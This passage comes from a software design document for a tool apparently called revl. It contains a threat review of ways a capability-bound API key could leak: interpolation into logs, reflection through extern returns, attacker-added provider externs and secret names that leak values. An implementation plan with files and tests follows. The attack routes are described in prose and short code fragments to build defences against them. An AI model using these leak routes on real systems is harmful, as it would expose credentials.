`model.complete` extern from also reaching `net.*` to an un-allowed host, so an
auditable extern that also opens an attacker socket is a boundary-policy-visible
reach. That reduces the residue to "a host body that exfiltrates *through its own
declared capability's legitimate channel*" (the provider extern smuggling the key
inside the very request to the provider), which no static system can catch and
which is indistinguishable from correct behaviour. The design's job is to state
this precisely and not one word more than it can prove.

### A4. Interpolation via an indirect path

**Attack (corrected).** The earlier draft answered this with the bound-key type
("`k` has type `Secret`, so `passthrough(x: Str)` is refused"). That answer is
withdrawn: the bound key has no revl-typed binding, so there is no `Secret`-typed
`k` in the value world to begin with. The real attack surfaces are two, and they
split by where the interpolation happens:
- **Inside the host body:** `prompt = f"sys {openai_key}"` in `@py`. **Not
  covered** by construction. This is A3: host code reading a host local. Confinement
  and the boundary policy narrow it; nothing in this feature refuses it.
- **After the key crosses a revl boundary:** a host body reflects the key into a
  returned `Str`, and revl code then interpolates it: `let s = complete(p); log
  ("${s}")`. **Covered** by flow: the reflected value carries `secret` origin
  (4a.1), and the interpolation-into-`log` is a crossing that refuses (4a.2), with
  no declassifier (4a.3). **Provable within the revl surface.** The only escape is
  the host-body case above (A3).

### A5. The audit table leaks the secret name (or timing/length)

**Attack.** The `secrets` table publishes `openai_key`, and the name itself, or
the presence/absence of a row, or a length, is a side channel. **Mitigation
(mostly holds; one residual).** The table carries name and capability only, never
value, length, hash, or timing (5a). The *name* is intentional: it is the
authority fact the manifest exists to publish, and it is chosen by the author, so
it need not resemble the value. **Residual (accepted, not open).** An author who
names a secret `openai_sk_live_51H...` leaks the value into the name. This is a
footgun, not a mechanism flaw; the mitigation is a lint (`revl` warns if a secret
*name* looks like a high-entropy token) and a doc rule ("name a secret for its
role, never its value"). Acceptable because the name is author-controlled and the
default posture (a role name) leaks nothing. Timing and length are not exposed:
the table is static, built from the IR, with no value present to measure.

### A6. Delegation of the bound capability widens reach

**Attack.** Component A holds `secret k for model.complete` and delegates the
`model.complete` capability to child B; does the key now reach B's bodies too,
unbound? **Mitigation (holds, by the capability-keyed design).** The key is
injected into *extern bodies whose declared capability matches the token*,
resolved at emit over the whole composition's externs. Delegation passes the
*capability*, and any extern serving `model.complete` in B's tier is, by the same
rule, a bound body. So the key reaches exactly the emissions of the capability
wherever they are, which is the intended semantics, and never any body outside
that capability. The audit shows the delegation via the
`secret:<capability>:<name>` crossing plus the existing capability delegation on
the G8 surface, so a delegation that widens where the key can be injected is
drift-visible. **Provable.** The injection set is a pure function of
`(program.secrets, all externs' capabilities)`, computed at emit, not
author-controllable per body.

### A7. Re-emission through the allowed sink to a different provider

**Attack.** The allowed sink (4b) admits a `secret`-tainted value re-crossing the
*same* capability; can an author register a *second*, attacker-controlled extern
for `model.complete` and receive the key there? **Mitigation (holds, via G2 and
audit).** Provision disjointness (G2) allows one provider per key per realm, and
every extern serving the capability is on the G8 surface; adding an extern for
`model.complete` is a boundary widening the audit gate flags. The key reaches all
bound bodies by design (A6), so the real control is that *which externs serve the
capability* is itself audited and disjointness-checked. An attacker-added provider
extern is not a silent path; it is a visible composition change.

### A8. A bound key reaches a `Secret[T]` receiver (the CRITICAL 1 attack)

**Attack.** A host body reflects the bound key out of its extern return (origin
`secret`) and revl code passes it to a `service ... fn take(x: Secret[Str])`
receiver, or to `endorse[secret]`. If both features shared one origin, the
`Secret[T]` receiver rule (or a declared `endorse`) would admit it and exfiltrate
it. **Mitigation (holds, by disjoint origins).** The bound key carries `secret`;
the `Secret[T]` receiver rule admits only `confidential` (7b); `_check_sinks`
never admits a `secret` value at a `Secret[T]` receiver. And `endorse[secret]` is
rejected unconditionally (4a.3). So both crossings refuse. **Test (required):** a
bound-key reflection passed to a `Secret[T]` receiver AND to `endorse[secret]` are
BOTH refused. This is the direct regression test for CRITICAL 1.

**Summary of the review.** A1, A2, A4 (revl-boundary half), A6, A7, A8 close
within the revl surface and are provable over the value graph and the emit-time
injection set. A5 has an accepted author-footgun residual with a lint mitigation.
**A3 is OPEN and is the honest limit**: host-body internal exfiltration (including
splicing the key into the model context) is outside G8's reasoning, and for the
bound key revl never held a typed binding to constrain. The guarantee is scoped to
"no revl construct and no declared crossing", and the doc states it no more
strongly.

## 9. Sliced implementation plan

Re-sliced so Slice 1 is the taint-side bound-key story, which is the REAL
by-construction guarantee, not the vacuous type-side mechanism the earlier draft
put first. Each later slice is additive and byte-identical when the feature is
unused.

### Slice 1: the bound key, flow half (the by-construction guarantee, landable alone)

The minimum that delivers "no revl construct and no declared crossing carries the
bound key out". This is the distinct `secret` origin plus the enumerated raise at
every crossing kind (4a.2). It does NOT include a bound-key type (there is none).

- `parser.py`: `secret NAME for CAP` contextual-keyword decl, `SecretDecl` node,
  `program.secrets`.
- `taint.py`: mint `model.sources[ext] = "secret"` unconditionally for a bound
  emission (in `extract_and_normalize`); add the `secret` raise at each crossing
  kind (4a.2): the `emit` arm (`taint.py:944`), the plain opaque extern call, the
  unnameable indirect / `*` callable, the provide-method return across the
  service/MCP bridge, and the nested-record/variant/generic case (which rides the
  existing joins and is caught at whichever crossing the container reaches);
  refuse `endorse[secret]` unconditionally in `_endorse` and skip the
  parser-declassifier launder in `_taint_of_call` for a `secret`-carrying
  argument; permit only the same-capability re-emission (4b). Fold `secret`
  reaches onto `comp["taint"]` as today. Add the `G-SECRET` code/category.
- `lower.py`: cross-index `program.secrets` against extern capabilities; refuse a
  secret bound to a capability whose only body is a non-injection tier (wasm);
  refuse a secret-name/local collision; carry the resolved bound-body set into the
  IR.
- `backends/python/emit.py`: emit `_REVL_SECRETS` + the fail-loud `_revl_secret`
  helper (guarded on "some emission extern has a bound secret"); bind the secret
  local as the first line of each bound extern's `def`.
- `run.py`: `_resolve_secrets` (env/secret-store sourced, keyed by name) and
  `module._REVL_SECRETS.update(...)` install; never log the value; keep it out of
  `--plan`.
- `tests/test_reach_completeness.py`: register the `secret`-raise row asserting
  the raise fires at ALL five crossing kinds (4a.4). This is the guardrail against
  the fold-misses-a-crossing bug class; it lands with Slice 1, not later.
- Tests: one per crossing kind (emit, plain extern, unnameable indirect,
  provide-return, nested container); a host body that reflects the key into its
  return is refused at the first downstream crossing; the same-capability
  re-emission is allowed; `endorse[secret]` and the verified-fn launder are both
  refused; a body that passes the key straight to its host call compiles and runs;
  a secret-free program is byte-identical (golden diff empty).

### Slice 2: the audit secrets table

- `audit_diff.py`: `_secrets_table(ir)`, the `"secrets"` entry in `audit_report`,
  and the `secret:<cap>:<name>` crossing in `crossings`.
- `docs/audit-diff.md`: document the new crossing token and drift semantics.
- Tests: the table is name-only; binding/rebinding-wider is a widening the diff
  gate flags; removing is a narrowing.

### Slice 3: `Secret[T]` information-flow (external proposal #9), distinct `confidential` origin

- `taint.py`: `Secret` as a third qualifier head in
  `strip_qualifiers`/`top_qualifier`/`_has_qualifier`/`extract_and_normalize`,
  minting the `confidential` origin (add `confidential` to `_ORIGIN_CLASSES`,
  disjoint from `secret`); the disclosure sink set (7b) as a derived class
  disjoint from the authority sinks, admitting a `confidential` value at a declared
  `Secret[T]` receiver but never a `secret` value; the audited
  `endorse[confidential]` declassifier (7c), which `_endorse` may accept while it
  continues to reject `endorse[secret]` unconditionally.
- `typecheck.py`: the base type sees `PaymentToken` (byte-identical); only the
  flow verdict is new.
- Cross-tier emit tiers (ts/go/java/rs) for the `_revl_secret` seam mirror the py
  shape (Slice 1 lands py first; this slice widens).
- Tests: `Secret[T]` refused at each disclosure sink; a declared `Secret[T]`
  service-operation parameter admits the crossing; the generic-launder case (A2);
  an audited `endorse[confidential]` downgrade recorded on the surface; the
  CRITICAL 1 regression (A8): a bound-key reflection passed to a `Secret[T]`
  receiver AND to `endorse[secret]` are BOTH refused.

Slice 1 is the spine and stands alone: it is the by-construction bound-key
guarantee. Slices 2 and 3 are each additive, each byte-identical when unused, and
each independently testable.
